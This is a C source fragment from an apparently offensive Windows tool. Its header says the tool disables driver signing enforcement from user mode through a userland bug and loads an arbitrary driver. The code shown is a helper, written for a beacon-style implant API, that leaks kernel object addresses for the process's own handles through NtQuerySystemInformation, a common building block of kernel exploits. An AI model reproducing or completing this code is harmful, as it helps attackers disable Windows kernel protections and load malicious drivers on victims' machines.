/**
 *
 * Disables driver signing enforcement from
 * usermode, and loads a requested driver
 * into memory.
 *
 * Do to the lack of a driver and usage of
 * a userland bug, this project remains 
 * closed source.
 *
**/

#include "common.h"

/**
 *
 * Purpose:
 *
 * Acquires a pointer to an object based on its
 * handle.
 *
**/

D_SEC( B ) PVOID ObjFromHandle( _In_ PBEACON_API BeaconApi, _In_ PAPI Api, _In_ HANDLE Pointer )
{
	ULONG				Idx = 0;
	PVOID				Obj = NULL;
	ULONG				Len = 0;
	PSYSTEM_HANDLE_INFORMATION	Inf = NULL;

	Len = sizeof( SYSTEM_HANDLE_INFORMATION );
	Inf = Api->LocalAlloc( LPTR, Len );

	while ( Api->NtQuerySystemInformation( SystemHandleInformation, Inf, Len, NULL ) == STATUS_INFO_LENGTH_MISMATCH ) {
		Api->LocalFree( Inf );
		Len = Len + 0x1000;
		Inf = Api->LocalAlloc( LPTR, Len );

		if ( Inf == NULL ) {
			goto Leave;
		};
	};

	for ( Idx = 0 ; Idx < Inf->NumberOfHandles ; ++Idx ) 
	{
		if ( ( USHORT )( Inf->Handles[ Idx ].UniqueProcessId ) == ( USHORT )( U_PTR( NtCurrentTeb()->ClientId.UniqueProcess ) ) ) 
		{
			if ( ( USHORT )( Inf->Handles[ Idx ].HandleValue ) == ( USHORT )( U_PTR( Pointer ) ) ) 
			{
				Obj = Inf->Handles[ Idx ].Object;
				break;
			};
		};
	};
Leave:
	if ( Inf != NULL ) {
		Api->LocalFree( Inf );
	};
	return Obj;
};
